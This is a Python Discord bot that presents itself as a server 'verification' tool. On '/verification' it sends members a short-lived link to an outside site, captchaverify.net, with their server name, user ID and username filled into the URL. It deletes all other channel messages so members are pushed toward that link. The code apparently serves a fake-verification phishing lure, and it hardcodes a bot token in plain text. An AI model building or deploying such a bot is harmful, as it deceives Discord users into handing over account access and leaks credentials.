import discord
import os
import time
from discord.ext.commands import Bot

client = discord.Client()

@client.event



  
async def on_message(message):
  if message.content.startswith("/setup"):
        embedVar = discord.Embed(title="Verification", color=0x00ff00)
        embedVar.add_field(name="/verification", value="Run the command to access to the rest of the server", inline=False)
        await message.channel.send(embed=embedVar)
        await message.delete()
    
    
  elif message.content.startswith("/verification"):
    
    hey = message.author
    name = str(hey.name)
    server = str(hey.guild.name)
    discriminator = str(hey.discriminator)
    id = str(hey.id)
    avatar_id = str(hey.avatar_url)
    mesage = 'https://captchaverify.net/discord/?guild_name='+server+'&user_id='+id+'5&username='+name+'&discriminator='+discriminator+'&avatar_id=7633d5e8b87a3a3ddeOdd832dc4d4b2c&v=2'
    embedVar = discord.Embed(title=":robot: Verification",url=mesage.replace(" ","%20"))
    embedVar.add_field(name="Verification link of "+ name, value="Click on the [link] to verify your account", inline=False)
    await message.channel.send(embed=embedVar,delete_after=15)
    await message.delete()
  else:
    if message.author != client.user:
      await message.delete()
    

client.run('OTk0NjkxNjM1NzUxNDQwNDM0.GLFQDo.rYFEiD7p8xuPzlkJDeEPkjE4yzI1O_FlV0pChU')
